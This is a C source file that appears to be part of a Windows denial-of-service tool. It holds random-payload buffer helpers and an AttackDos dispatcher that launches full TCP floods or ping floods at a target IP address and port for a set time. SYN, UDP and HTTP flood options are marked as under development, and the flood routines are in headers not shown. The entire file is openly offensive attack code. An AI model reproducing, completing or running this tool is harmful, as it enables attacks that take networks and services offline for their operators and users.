#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "AttackFloodFullTCP.h"
#include "AttackFloodPing.h"

UCHAR GenRandChar() {
	return rand() % 256;
}
BOOL CopyRandBuffer(UCHAR* pBuffer, UINT bufferSize) {
	for (UINT i = 0; i < bufferSize; i++)
		pBuffer[i] = (UCHAR)GenRandChar();
	return TRUE;
}
BOOL CopyRandBufferAlloc(UCHAR** pBuffer, UINT bufferSize) {
	UCHAR* payloadBuffer = (UCHAR*)malloc(bufferSize + 1);
	if (payloadBuffer == NULL)
		return FALSE;
	for (UINT i = 0; i < bufferSize; i++)
		payloadBuffer[i] = (UCHAR)GenRandChar();

	*pBuffer = payloadBuffer;
	return TRUE;
}

BOOL AttackDos(DosStruct dosStruct) {
	switch (dosStruct.attackType) {
	case  TCP_FLOOD_SYN:
		printf("[d] Underdevelopment !!!\n\n");
		break;
	case  TCP_FLOOD_FULL:
		AttackFloodFullTcp(dosStruct.ipAddress, dosStruct.port, dosStruct.time, dosStruct.dataSize, FALSE);
		break;
	case  UDP_FLOOD:
		printf("[d] Underdevelopment !!!\n\n");
		break;
	case  PING_FLOOD:
		AttackFloodPing(dosStruct.ipAddress, dosStruct.dataSize, dosStruct.time);
		break;
	case  HTTP_FLOOD:
		printf("[d] Underdevelopment !!!\n\n");
		break;
	default:
		break;
	}
	return TRUE;
}